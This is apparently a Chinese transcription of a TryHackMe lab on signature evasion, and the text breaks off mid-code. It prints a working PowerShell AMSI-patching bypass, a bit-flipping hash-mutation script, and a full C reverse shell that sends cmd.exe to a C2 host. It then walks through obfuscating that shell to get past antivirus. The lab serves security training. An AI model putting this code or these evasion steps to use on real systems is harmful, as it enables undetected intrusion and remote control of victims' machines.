<h3 id="分割和合并对象"><a href="#分割和合并对象" class="headerlink" title="分割和合并对象"></a>分割和合并对象</h3><p>拆分或合并对象所需的方法与<a target="_blank" rel="noopener" href="https://tryhackme.com/room/signatureevasion">混淆原则</a>中介绍的串联目标非常相似。</p>
<p>这个概念背后的前提相对简单，我们正在寻求创建一个新的对象函数，它可以在保持以前的功能的同时打破签名。</p>
<p>为了提供更具体的示例，我们可以使用“GetMessageFormat”字符串中存在的 Covenant 中的<a target="_blank" rel="noopener" href="https://offectivedefence.co.uk/posts/covenant-profiles-templates/">众所周知的案例研究</a>。 我们将首先了解该解决方案是如何实现的，然后将其分解并将其应用于混淆分类法。</p>
<p><strong>原始字符串</strong></p>
<p>下面是检测到的原始字符串</p>
<figure class="highlight csharp"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> MessageFormat = <span class="string">@"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2},""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p><strong>Obfuscated Method</strong></p>
<p>下面是用于替换和连接字符串的新类。</p>
<figure class="highlight csharp"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> GetMessageFormat <span class="comment">// Format the public method</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">get</span> <span class="comment">// Return the property value</span></span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">var</span> sb = <span class="keyword">new</span> StringBuilder(<span class="string">@"{{""GUID"":""{0}"","</span>); <span class="comment">// Start the built-in concatenation method</span></span><br><span class="line">        sb.Append(<span class="string">@"""Type"":{1},"</span>); <span class="comment">// Append substrings onto the string</span></span><br><span class="line">        sb.Append(<span class="string">@"""Meta"":""{2}"","</span>);</span><br><span class="line">        sb.Append(<span class="string">@"""IV"":""{3}"","</span>);</span><br><span class="line">        sb.Append(<span class="string">@"""EncryptedMessage"":""{4}"","</span>);</span><br><span class="line">        sb.Append(<span class="string">@"""HMAC"":""{5}""}}"</span>);</span><br><span class="line">        <span class="keyword">return</span> sb.ToString(); <span class="comment">// Return the concatenated string to the class</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> MessageFormat = GetMessageFormat</span><br></pre></td></tr></tbody></table></figure>

<p>回顾一下这个案例研究，类分割用于为要连接的局部变量创建一个新类。 我们将在本任务后面以及整个实际挑战中介绍如何识别何时使用特定方法。</p>
<hr>
<h3 id="删除和隐藏可识别信息"><a href="#删除和隐藏可识别信息" class="headerlink" title="删除和隐藏可识别信息"></a>删除和隐藏可识别信息</h3><p>删除可识别信息背后的核心概念类似于<a target="_blank" rel="noopener" href="https://tryhackme.com/room/signatureevasion">模糊处理原则</a>中介绍的模糊变量名称。 在此任务中，我们更进一步，将其专门应用于任何对象（包括方法和类）中的已识别签名。</p>
<p>Mimikatz 中可以找到这样的示例，其中为字符串“wdigest.dll”生成警报。 这可以通过用在字符串的所有实例中更改的任何随机标识符替换字符串来解决。 这可以归类为方法代理技术下的混淆分类法。</p>
<p>这与<a target="_blank" rel="noopener" href="https://tryhackme.com/room/signatureevasion">混淆原则</a>中讨论的几乎没有什么不同； 然而，它适用于特定情况。</p>
<hr>
<p>利用您在整个任务中积累的知识，使用 AmsiTrigger 来混淆以下 PowerShell 代码片段以实现可视化签名。</p>
<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$MethodDefinition</span> = <span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    [DllImport(`"kernel32`")]</span></span><br><span class="line"><span class="string">    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    [DllImport(`"kernel32`")]</span></span><br><span class="line"><span class="string">    public static extern IntPtr GetModuleHandle(string lpModuleName);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    [DllImport(`"kernel32`")]</span></span><br><span class="line"><span class="string">    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Kernel32</span> = <span class="built_in">Add-Type</span> <span class="literal">-MemberDefinition</span> <span class="variable">$MethodDefinition</span> <span class="literal">-Name</span> <span class="string">'Kernel32'</span> <span class="literal">-NameSpace</span> <span class="string">'Win32'</span> <span class="literal">-PassThru</span>;</span><br><span class="line"><span class="variable">$A</span> = <span class="string">"AmsiScanBuffer"</span></span><br><span class="line"><span class="variable">$handle</span> = [<span class="type">Win32.Kernel32</span>]::GetModuleHandle(<span class="string">'amsi.dll'</span>);</span><br><span class="line">[<span class="built_in">Int</span><span class="type">Ptr</span>]<span class="variable">$BufferAddress</span> = [<span class="type">Win32.Kernel32</span>]::GetProcAddress(<span class="variable">$handle</span>, <span class="variable">$A</span>);</span><br><span class="line">[<span class="type">UInt32</span>]<span class="variable">$Size</span> = <span class="number">0</span>x5;</span><br><span class="line">[<span class="type">UInt32</span>]<span class="variable">$ProtectFlag</span> = <span class="number">0</span>x40;</span><br><span class="line">[<span class="type">UInt32</span>]<span class="variable">$OldProtectFlag</span> = <span class="number">0</span>;</span><br><span class="line">[<span class="type">Win32.Kernel32</span>]::VirtualProtect(<span class="variable">$BufferAddress</span>, <span class="variable">$Size</span>, <span class="variable">$ProtectFlag</span>, [<span class="type">Ref</span>]<span class="variable">$OldProtectFlag</span>);</span><br><span class="line"><span class="variable">$buf</span> = [<span class="built_in">Byte</span>[]]([<span class="type">UInt32</span>]<span class="number">0</span>xB8,[<span class="type">UInt32</span>]<span class="number">0</span>x57, [<span class="type">UInt32</span>]<span class="number">0</span>x00, [<span class="type">Uint32</span>]<span class="number">0</span>x07, [<span class="type">Uint32</span>]<span class="number">0</span>x80, [<span class="type">Uint32</span>]<span class="number">0</span>xC3); </span><br><span class="line"></span><br><span class="line">[<span class="type">system.runtime.interopservices.marshal</span>]::<span class="built_in">copy</span>(<span class="variable">$buf</span>, <span class="number">0</span>, <span class="variable">$BufferAddress</span>, <span class="number">6</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>充分混淆后，将代码片段提交到网络服务器“<a target="_blank" rel="noopener" href="http://10.10.254.33/challenge-1.html%E2%80%9D%E3%80%82">http://10.10.254.33/challenge-1.html”。</a> 文件名必须保存为“challenge-1.ps1”。 如果正确混淆，警报弹出窗口中将出现一个标志</p>
<h1 id="Static-Property-Based-Signatures"><a href="#Static-Property-Based-Signatures" class="headerlink" title="Static Property-Based Signatures"></a>Static Property-Based Signatures</h1><p>各种检测引擎或分析人员可能会考虑不同的指标而不是字符串或静态签名来促进他们的假设。 签名可以附加到多个文件属性，包括文件哈希、熵、作者、名称或其他可单独或结合使用的可识别信息。 这些属性通常用于 <strong>YARA</strong> 或 <strong>Sigma</strong> 等规则集中。</p>
<p>某些属性可能很容易操纵，而另一些属性可能更困难，特别是在处理预编译的闭源应用程序时。</p>
<p>此任务将讨论操作开源和闭源应用程序的<strong>文件哈希</strong>和<strong>熵</strong>。</p>
<p>注意：其他几个属性（例如 PE 标头或模块属性）可以用作指示符。 由于这些属性通常需要代理或其他措施来检测，因此我们不会在这个房间中介绍它们，以将重点放在签名上。</p>
<hr>
<h3 id="文件哈希值"><a href="#文件哈希值" class="headerlink" title="文件哈希值"></a>文件哈希值</h3><p><strong>文件哈希</strong>，也称为<strong>校验和</strong>，用于标记/标识唯一文件。 它们通常用于验证文件的真实性或其已知目的（恶意或非恶意）。 文件哈希值通常可以任意修改，并且会因对文件的任何修改而改变。</p>
<p>如果我们有权访问应用程序的源代码，我们可以修改代码的任意部分并重新编译它以创建新的哈希值。 该解决方案很简单，但如果我们需要预编译或签名的应用程序怎么办？</p>
<p>在处理签名或闭源应用程序时，我们必须采用<strong>位翻转</strong>。</p>
<p>位翻转是一种常见的加密攻击，它将通过翻转和测试每个可能的位直到找到可行的位来改变给定的应用程序。 通过翻转一个可行的位，它将更改应用程序的签名和哈希，同时保留所有功能。</p>
<p>我们可以使用脚本通过翻转每一位并创建新的<strong>变异变体</strong>（~3000 - 200000 个变体）来创建<strong>位翻转列表</strong>。 下面是 python 位翻转实现的示例。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">orig = <span class="built_in">list</span>(<span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">"rb"</span>).read())</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(orig):</span><br><span class="line">	current = <span class="built_in">list</span>(orig)</span><br><span class="line">	current[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(current[i]) ^ <span class="number">0xde</span>)</span><br><span class="line">	path = <span class="string">"%d.exe"</span> % i</span><br><span class="line">	</span><br><span class="line">	output = <span class="string">""</span>.join(<span class="built_in">str</span>(e) <span class="keyword">for</span> e <span class="keyword">in</span> current)</span><br><span class="line">	<span class="built_in">open</span>(path, <span class="string">"wb"</span>).write(output)</span><br><span class="line">	i += <span class="number">1</span></span><br><span class="line">	</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"done"</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>创建列表后，我们必须搜索文件的完整独特属性。 例如，如果我们对“msbuild”进行位翻转，则需要使用“signtool”来搜索具有可用证书的文件。 这将保证文件的功能不会被破坏，并且应用程序将保持其签名的属性。</p>
<p>我们可以利用脚本循环遍历位翻转列表并验证功能变体。 以下是批处理脚本实现的示例。</p>
<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">FOR</span> /L %%A <span class="keyword">IN</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">10000</span>) <span class="keyword">DO</span> (</span><br><span class="line">	signtool verify /v /a flipped\\%%A.exe</span><br><span class="line">)</span><br></pre></td></tr></tbody></table></figure>

<p>这种技术可能非常有利可图，尽管它可能需要很长时间，并且在发现哈希值之前只有有限的时间。 下面是原始 MSBuild 应用程序和位翻转变体的比较。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/ab3f859f9dc34e6c4b41fe3437b2396d.png" alt="Image of WinMD5Free showing the hash of Original.exe"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3e4c0050212e7c69d408135de36976a3.png" alt="Image of WinMD5Free showing the hash of Variant.exe"></p>
<hr>
<h3 id="Entropy"><a href="#Entropy" class="headerlink" title="Entropy"></a>Entropy</h3><p>在 <a target="_blank" rel="noopener" href="https://www.ibm.com/docs/en/qsip/7.4?topic=content-analyzing-files-embedded-malicious-activity">IBM</a> 中，熵被定义为“数据的随机性” 用于确定文件是否包含隐藏数据或可疑脚本的文件。” EDR 和其他扫描程序通常利用熵来识别潜在的可疑文件或对总体恶意评分做出贡献。</p>
<p>对于模糊的脚本来说，熵可能会产生问题，特别是在模糊可识别信息（例如变量或函数）时。</p>
<p>为了降低熵，我们可以用随机选择的英文单词替换随机标识符。 例如，我们可以将变量从“q234uf”更改为“nature”。</p>
<p>为了证明更改标识符的有效性，我们可以使用 [CyberChef](<a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/#recipe=Entropy">https://gchq.github.io/CyberChef/#recipe=Entropy</a>(‘Shannon scale’)) 观察熵如何变化。</p>
<p>以下是标准英语段落的香农熵表。</p>
<p><strong>Shannon entropy: 4.587362034903882</strong></p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/96630d6dbe47ad3204cc121e9b5bf84e.png" alt="Status bar showing the entropy of an english paragraph">**</p>
<p>下面是带有随机标识符的小脚本的香农熵标度。</p>
<p><strong>Shannon entropy: 5.341436973971389</strong></p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/92db2f5431d34098678bbcbf8170af52.png" alt="Status bar showing the entropy of a small script with randomization">**</p>
<p>根据所采用的 EDR，“可疑”熵值 <strong>~ 大于 6.8</strong>。**</p>
<p>随着文件变大和出现次数增多，随机值和英文文本之间的差异将会变得更大。</p>
<p>请注意，熵通常不会单独使用，而仅用于支持假设。 例如，命令“pskill”和 hivenightmare 漏洞利用的熵几乎相同。</p>
<p>为了了解熵的作用，让我们看看 EDR 如何使用它来贡献威胁指标。</p>
<p>在白皮书中，<a target="_blank" rel="noopener" href="https://www.mdpi.com/2624-800X/1/3/21/pdf">针对高级持续威胁攻击向量的端点检测和响应系统的实证评估</a><em>,</em> ** SentinelOne** <em>显示由于高熵而检测 DLL，特别是通过 AES 加密。</em></p>
<h1 id="Behavioral-Signatures"><a href="#Behavioral-Signatures" class="headerlink" title="Behavioral Signatures"></a>Behavioral Signatures</h1><p>混淆函数和属性可以通过最少的修改实现很多效果。 即使在破坏附加到文件的静态签名之后，现代引擎仍然可以观察二进制文件的行为和功能。 这给攻击者带来了许多无法通过简单的混淆来解决的问题。</p>
<p>正如<a target="_blank" rel="noopener" href="https://tryhackme.com/room/introtoav">防病毒简介</a>中所述，现代防病毒引擎将采用两种常见方法来检测行为：观察导入和挂钩已知的恶意调用。 虽然导入（正如本任务中将介绍的那样）可以很容易地以最低的要求进行混淆或修改，但挂钩需要复杂的技术，超出了本房间的范围。 由于 API 调用的普遍存在，观察这些函数以及其他行为测试/考虑因素可能是确定文件是否可疑的重要因素。</p>
<p>在深入讨论重写或导入调用之前，我们先讨论一下传统上如何利用和导入 API 调用。 我们将首先介绍基于 C 的语言，然后在此任务中稍后简要介绍基于 .NET 的语言。</p>
<p>API 调用和操作系统本机的其他函数需要指向函数地址的指针和使用它们的结构。</p>
<p>函数的结构简单； 它们位于<strong>导入库</strong>中，例如“kernel32”或“ntdll”，它们存储 Windows 的函数结构和其他核心信息。</p>
<p>函数导入最重要的问题是函数地址。 获取指针可能看起来很简单，但由于 <strong>ASLR</strong> (<strong>A</strong>ddress <strong>S</strong>pace <strong>L</strong>ayout <strong>R</strong>andomization)，函数地址是动态的并且必须找到 。</p>
<p>不是在运行时更改代码，而是使用 <strong>Windows 加载程序</strong> <code>windows.h</code>。 在运行时，加载程序会将所有模块映射到进程地址空间并列出每个模块的所有函数。 它处理模块，但是函数地址是如何分配的呢？</p>
<p>Windows 加载程序最关键的功能之一是<strong>IAT（I</strong>mport <strong>A</strong>ddress <strong>T</strong>able）。 IAT将存储所有可以为函数分配指针的导入函数的函数地址。</p>
<p>IAT 存储在 <strong>PE</strong> (<strong>P</strong>ortable <strong>E</strong>xecutable) 标头“IMAGE_OPTIONAL_HEADER”中，并由 Windows 加载程序在运行时填充。 Windows 加载程序从指针表获取函数地址，或者更准确地说，从 API 调用或 <strong>thunk 表</strong> 访问的 <strong>thunk</strong>。 有关 PE 结构的更多信息，请查看 <a target="_blank" rel="noopener" href="https://tryhackme.com/room/windowsinternals">Windows Internals room</a>。</p>
<p>乍一看，API 被分配了一个指向 thunk 的指针，作为来自 Windows 加载程序的函数地址。 为了使这一点更加具体，我们可以观察一个函数的 PE 转储示例。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/0d4ba9ba4348b53036cb2127f4968e87.png" alt="Image of DiE showing the IAT table of a binary"></p>
<hr>
<p>导入表可以提供对二进制文件功能的深入了解，这可能对攻击者不利。 但是如果我们的函数需要分配函数地址的话，如何才能防止我们的函数出现在IAT中呢？</p>
<p>正如简要提到的，thunk 表并不是获取函数地址指针的唯一方法。 我们还可以利用 API 调用从导入库本身获取函数地址。 此技术称为“动态加载”，可用于避免 IAT 并最大限度地减少 Windows 加载程序的使用。</p>
<p>我们将编写结构并为函数创建新的任意名称以采用动态加载。</p>
<p>在较高的层次上，我们可以将 C 语言中的动态加载分为四个步骤，</p>
<ol>
<li>定义调用的结构</li>
<li>获取调用地址所在模块的句柄<br>3.获取调用的进程地址<br>4.使用新创建的调用</li>
</ol>
<p>要开始动态加载 API 调用，我们必须首先在主函数之前定义调用的结构。 调用结构将定义调用函数可能需要的任何输入或输出。 我们可以在微软文档中找到特定调用的结构。 例如，可以在<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcomputernamea">此处</a>找到“GetComputerNameA”的结构。 因为我们将其实现为 C 中的新调用，所以语法必须稍作更改，但结构保持不变，如下所示。</p>
<figure class="highlight cpp"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 1. Define the structure of the call</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span> <span class="params">(WINAPI* myNotGetComputerNameA)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	LPSTR   lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPDWORD nSize</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></tbody></table></figure>

<p>要访问 API 调用的地址，我们必须首先加载定义它的库。 我们将在主函数中定义它。 对于任何 Windows API 调用，这通常是“kernel32.dll”或“ntdll.dll”。 下面是将库加载到模块句柄所需的语法示例。</p>
<figure class="highlight cpp"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 2. Obtain the handle of the module the call address is present in </span></span><br><span class="line">HMODULE hkernel32 = <span class="built_in">LoadLibraryA</span>(<span class="string">"kernel32.dll"</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>使用之前加载的模块，我们可以获得指定API调用的进程地址。 这将直接在“LoadLibrary”调用之后发生。 我们可以通过将其与先前定义的结构一起转换来存储此调用。 以下是获取 API 调用所需的语法示例。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 3. Obtain the process address of the call</span></span><br><span class="line">myNotGetComputerNameA notGetComputerNameA = (myNotGetComputerNameA) GetProcAddress(hkernel32, <span class="string">"GetComputerNameA"</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>尽管这种方法解决了许多问题，但仍有一些注意事项必须注意。 首先，<code>GetProcAddress</code>和<code>LoadLibraryA</code>仍然存在于IAT中； 尽管不是直接指标，但它可能导致或加剧怀疑； 这个问题可以使用<strong>PIC</strong>（<strong>P</strong>位置<strong>I</strong>独立<strong>C</strong>代码）来解决。 现代代理还将挂钩特定功能并监视内核交互； 这可以使用 <strong>API 取消挂钩</strong> 来解决。</p>
<hr>
<p>使用您在整个任务中积累的知识，混淆以下 C 代码片段，确保 IAT 中不存在可疑的 API 调用。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;lm.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"GetComputerNameA: 0x%p\\n"</span>, GetComputerNameA);</span><br><span class="line">    CHAR hostName[<span class="number">260</span>];</span><br><span class="line">    DWORD hostNameLength = <span class="number">260</span>;</span><br><span class="line">    <span class="keyword">if</span> (GetComputerNameA(hostName, &amp;hostNameLength)) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"hostname: %s\\n"</span>, hostName);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>充分混淆后，将代码片段提交到网络服务器“<a target="_blank" rel="noopener" href="http://10.10.254.33/challenge-2.html%E2%80%9D%E3%80%82">http://10.10.254.33/challenge-2.html”。</a> 文件名必须保存为“challenge-2.exe”。 如果正确混淆，警报弹出窗口中将出现一个标志。</p>
<h1 id="Putting-It-All-Together"><a href="#Putting-It-All-Together" class="headerlink" title="Putting It All Together"></a>Putting It All Together</h1><p>正如本会议室和<a target="_blank" rel="noopener" href="https://tryhackme.com/room/obfuscationprinciples">混淆原则</a> 所重申的那样，没有一种方法是 100% 有效或可靠的。</p>
<p>为了创建更有效、更可靠的方法，我们可以结合本房间和上一个房间中介绍的几种方法。</p>
<p>在确定要开始混淆的顺序时，请考虑每种方法的影响。 例如，混淆一个已经被破坏的类更容易，还是破坏一个被混淆的类更容易？</p>
<p>注意：一般来说，您应该在特定签名破解后运行自动混淆或不太具体的混淆方法，但是，您不需要这些技术来应对此挑战。</p>
<p>考虑到这些注释，修改提供的二进制文件以满足以下规范。</p>
<ol>
<li>不存在可疑的库调用</li>
<li>没有泄露函数或变量名</li>
<li>文件哈希与原始哈希不同</li>
<li>二进制绕过常见的反病毒引擎</li>
</ol>
<p>注意：在考虑库调用和泄漏函数时，请注意二进制文件的 IAT 表和字符串。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_BUFLEN 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RunShell</span><span class="params">(<span class="type">char</span>* C2Server, <span class="type">int</span> C2Port)</span> {</span><br><span class="line">        SOCKET mySocket;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">        WSADATA version;</span><br><span class="line">        WSAStartup(MAKEWORD(<span class="number">2</span>,<span class="number">2</span>), &amp;version);</span><br><span class="line">        mySocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        addr.sin_family = AF_INET;</span><br><span class="line"></span><br><span class="line">        addr.sin_addr.s_addr = inet_addr(C2Server);</span><br><span class="line">        addr.sin_port = htons(C2Port);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (WSAConnect(mySocket, (SOCKADDR*)&amp;addr, <span class="keyword">sizeof</span>(addr), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)==SOCKET_ERROR) {</span><br><span class="line">            closesocket(mySocket);</span><br><span class="line">            WSACleanup();</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Connected to %s:%d\\n"</span>, C2Server, C2Port);</span><br><span class="line"></span><br><span class="line">            <span class="type">char</span> Process[] = <span class="string">"cmd.exe"</span>;</span><br><span class="line">            STARTUPINFO sinfo;</span><br><span class="line">            PROCESS_INFORMATION pinfo;</span><br><span class="line">            <span class="built_in">memset</span>(&amp;sinfo, <span class="number">0</span>, <span class="keyword">sizeof</span>(sinfo));</span><br><span class="line">            sinfo.cb = <span class="keyword">sizeof</span>(sinfo);</span><br><span class="line">            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);</span><br><span class="line">            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;</span><br><span class="line">            CreateProcess(<span class="literal">NULL</span>, Process, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;sinfo, &amp;pinfo);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Process Created %lu\\n"</span>, pinfo.dwProcessId);</span><br><span class="line"></span><br><span class="line">            WaitForSingleObject(pinfo.hProcess, INFINITE);</span><br><span class="line">            CloseHandle(pinfo.hProcess);</span><br><span class="line">            CloseHandle(pinfo.hThread);</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> {</span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">3</span>) {</span><br><span class="line">        <span class="type">int</span> port  = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">        RunShell(argv[<span class="number">1</span>], port);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        <span class="type">char</span> host[] = <span class="string">"10.10.10.10"</span>;</span><br><span class="line">        <span class="type">int</span> port = <span class="number">53</span>;</span><br><span class="line">        RunShell(host, port);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">} </span><br></pre></td></tr></tbody></table></figure>

<p>充分混淆后，使用 GCC 或其他 C 编译器在您选择的 AttackBox 或 VM 上编译有效负载。 文件名必须保存为“challenge.exe”。 编译后，将可执行文件提交到位于<code>http://MACHINE_IP/</code><a target="_blank" rel="noopener" href="http://machine_ip/">.</a>的网络服务器。如果您的有效负载满足列出的要求，它将运行并将信标发送到 提供服务器IP和端口。</p>
<p>注意：还必须更改提供的有效负载中的“C2Server”和“C2Port”变量，否则此挑战将无法正常工作，并且您将不会收到 shell 返回。</p>
<p>注意：使用 GCC 编译时，您需要添加“winsock2”和“ws2tcpip”的编译器选项。 可以使用编译器标志“-lwsock32”和“-lws2_32”包含这些库</p>
<p>如果您仍然遇到困难，我们在下面提供了解决方案的演练。</p>
<p>对于这个挑战，我们得到了一个不是我们创建的二进制文件。 我们的第一个目标是从逆向工程师的角度熟悉二进制文件。 有签名吗？ 它的PE结构是什么样的？ IAT中有什么重要信息吗？</p>
<p>如果您针对 ThreatCheck 或类似工具运行二进制文件，您会注意到它当前没有检测到，因此我们可以继续前进。</p>
<p>如果您按照任务 6 中的讨论检查二进制文件 IAT 表，您会注意到大约有 7 个独特的 API 调用可以指示该二进制文件的目标。</p>
<p>我们将演练动态调用一个 API 调用，然后希望您重复其余调用的步骤。</p>
<p>让我们看一下“WSAConnect”的<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect">Windows文档</a>； 下面是从文档中获得的结构</p>
<figure class="highlight cpp"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> WSAAPI <span class="title">WSAConnect</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  SOCKET         s,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  <span class="type">const</span> sockaddr *name,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  <span class="type">int</span>            namelen,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPWSABUF       lpCallerData,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] LPWSABUF       lpCalleeData,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPQOS          lpSQOS,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPQOS          lpGQOS</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></tbody></table></figure>

<p>我们现在可以重写它以满足结构定义的要求。</p>
<figure class="highlight cpp"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(WSAAPI* WSACONNECT)</span><span class="params">(SOCKET s,<span class="type">const</span> <span class="keyword">struct</span> sockaddr *name,<span class="type">int</span> namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS)</span></span>;</span><br></pre></td></tr></tbody></table></figure>

<p>现在我们需要导入存储调用的库。这只需要发生一次，因为所有调用都使用相同的库。</p>
<figure class="highlight cpp"><table><tbody><tr><td class="code"><pre><span class="line">HMODULE hws2_32 = <span class="built_in">LoadLibraryW</span>(<span class="string">L"ws2_32"</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>要使用API调用，我们必须获取指向该地址的指针。</p>
<figure class="highlight cpp"><table><tbody><tr><td class="code"><pre><span class="line">WSACONNECT myWSAConnect = (WSACONNECT) <span class="built_in">GetProcAddress</span>(hws2_32, <span class="string">"WSAConnect"</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>获得指针后，我们可以使用新指针更改所有出现的 API 调用。</p>
<figure class="highlight cpp"><table><tbody><tr><td class="code"><pre><span class="line">mySocket = <span class="built_in">myWSASocketA</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>完成后，您的结构定义应类似于以下代码片段</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span><span class="params">(WSAAPI* WSASTARTUP)</span><span class="params">(WORD wVersionRequested,LPWSADATA lpWSAData)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">SOCKET</span><span class="params">(WSAAPI* WSASOCKETA)</span><span class="params">(<span class="type">int</span> af,<span class="type">int</span> type,<span class="type">int</span> protocol,LPWSAPROTOCOL_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">unsigned</span><span class="params">(WSAAPI* INET_ADDR)</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cp)</span>;</span><br><span class="line"><span 